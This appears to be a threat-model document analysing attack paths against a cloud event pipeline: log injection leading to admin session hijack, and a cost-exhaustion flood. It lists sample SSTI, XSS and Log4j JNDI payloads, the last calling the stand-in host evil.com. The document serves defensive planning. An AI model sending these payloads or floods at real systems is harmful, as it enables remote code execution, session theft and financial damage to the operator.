# Attack Path Analysis: Event Pipeline

## Scenario 1: Poisoned Log Injection (The "Log4Shell" Pattern)

**Goal**: Execute code on internal admin dashboards or SIEM tools.
**Precondition**: Attacker can send JSON events to the public ingestion endpoint.

### Kill Chain Steps
1.  **Reconnaissance**: Attacker sends normal telemetry.
2.  **Weaponization**: Attacker fuzzes fields with known injection payloads:
    *   `{{7*7}}` (SSTI)
    *   `<script>alert(1)</script>` (XSS)
    *   `${jndi:ldap://evil.com/x}` (Log4j)
3.  **Delivery**: Send 10,000 requests with payloads in the `user_agent` field.
4.  **Exploitation**:
    *   Payload rests in S3 (Text file).
    *   Admin opens "Failed Events" dashboard which naively renders the log lines.
    *   XSS triggers in Admin browser -> Cookie Stealing -> Admin Session Hijack.

## Scenario 2: Denial of Wallet (Resource Exhaustion)

**Goal**: Cause financial damage.
**Precondition**: Public endpoint has no rate limiting or weak WAF.

### Kill Chain Steps
1.  **Scaling**: Attacker rents a botnet.
2.  **Attack**: Send 1 billion requests (1KB each) to the endpoint.
3.  **Impact**:
    *   ALB Ingress costs.
    *   Lambda invocations (1B invocations).
    *   Kinesis Shard hours.
    *   **Result**: Estimated bill spike of $50,000+ in 24 hours.
